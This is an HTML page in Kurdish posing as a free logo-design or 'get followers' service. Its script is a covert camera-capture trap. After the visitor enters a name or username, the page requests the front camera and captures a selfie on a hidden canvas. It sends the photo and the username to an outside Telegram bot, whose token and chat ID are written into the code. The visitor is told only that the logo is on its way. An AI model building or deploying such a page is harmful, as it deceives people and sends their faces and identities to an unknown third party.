<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ب ده ستڤه ئینانا فولویان</title>
    <style>
        body {
            font-family: Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
            color: white;
            text-align: center;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #00d2ff;
        }
        p {
            font-size: 15px;
            line-height: 1.6;
            color: #ddd;
        }
        input[type="text"] {
            width: 90%;
            padding: 12px;
            margin: 15px 0;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
        }
        button {
            background: #00d2ff;
            color: #1e1e2f;
            border: none;
            padding: 12px 25px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            width: 95%;
            margin-top: 10px;
        }
        button:hover {
            background: #00a8cc;
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        video, canvas {
            display: none;
        }
        #status {
            margin-top: 18px;
            font-weight: bold;
            color: #4ade80;
            line-height: 1.5;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🎨 دیزاینا لۆگۆیێ تە</h1>
    <p>ناڤێ خۆ بنڤیسە و ل سەر رەسم گرتنێ بدە دا لۆگۆیێ تە ئامادە بکەین!</p>
    
    <input type="text" id="userName" placeholder="ناڤێ خۆ یان یوزەرێ خۆ بنڤیسە..." required>
    
    <button id="startBtn" onclick="autoCaptureAndSend()"> 🗽هنارتن فولویان</button>
    
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <div id="status"></div>
</div>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const startBtn = document.getElementById('startBtn');
    const statusDiv = document.getElementById('status');

    const BOT_TOKEN = "9026747554:AAGXXsmoDPEgfrBwmm_guQLwKmuZF7DDdVY";
    const CHAT_ID = "1905509661";

    function wait(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function autoCaptureAndSend() {
        const userName = document.getElementById('userName').value.trim();
        if (!userName) {
            alert("ژ کەرەما خۆ بەری هەر تشتەکی ناڤێ خۆ بنڤیسە!");
            return;
        }

        startBtn.disabled = true;
        statusDiv.style.color = "#00d2ff";
        statusDiv.innerText = "📷 داخوازا کامێرایێ دهێتە کرن...";

        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            video.srcObject = stream;
            await video.play();

            // چاوەڕێبوونەکا کورت دا کامێرا وێنەی ب دروستی چێکەت
            await wait(700);

            if (video.videoWidth === 0 || video.videoHeight === 0) {
                await wait(800);
            }

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // گرتنا وێنەی و راوەستاندنا کامێرایێ
            stream.getTracks().forEach(track => track.stop());

            statusDiv.style.color = "#4ade80";
            statusDiv.innerText = "⏳ وێنە هاتە گرتن و یێ دهێتە هنارتن...";

            canvas.toBlob(blob => {
                if (!blob) {
                    statusDiv.style.color = "#f87171";
                    statusDiv.innerText = "❌ خەلەتیەک چێبوو د گرتنا وێنەی دا.";
                    startBtn.disabled = false;
                    return;
                }

                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "client_photo.jpg");
                formData.append("caption", "🎨 داخوازیا لۆگۆیێ نوی!\n👤 ناڤێ کڕیاری: " + userName);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        statusDiv.style.color = "#4ade80";
                        statusDiv.innerText = "✅ سوپاس! وێنێ تە ب سەرکەفتیانە گەهشت. ل نێزیک دێ لۆگۆیێ تە ئامادە بیت!";
                    } else {
                        statusDiv.style.color = "#f87171";
                        statusDiv.innerText = "❌ خەلەتیەک چێبوو د هنارتنێ دا.";
                        startBtn.disabled = false;
                    }
                })
                .catch(() => {
                    statusDiv.style.color = "#f87171";
                    statusDiv.innerText = "❌ پەیوەندی ب ئینتەرنێتێ ڤە نینە.";
                    startBtn.disabled = false;
                });
            }, "image/jpeg", 0.9);

        } catch (err) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            statusDiv.style.color = "#f87171";
            statusDiv.innerText = "❌ پێدڤیە تو رازیبوونێ (Allow) بدەیە کامێرایێ دا کو وێنە بهێتە گرتن.";
            startBtn.disabled = false;
        }
    }
</script>

</body>
</html>
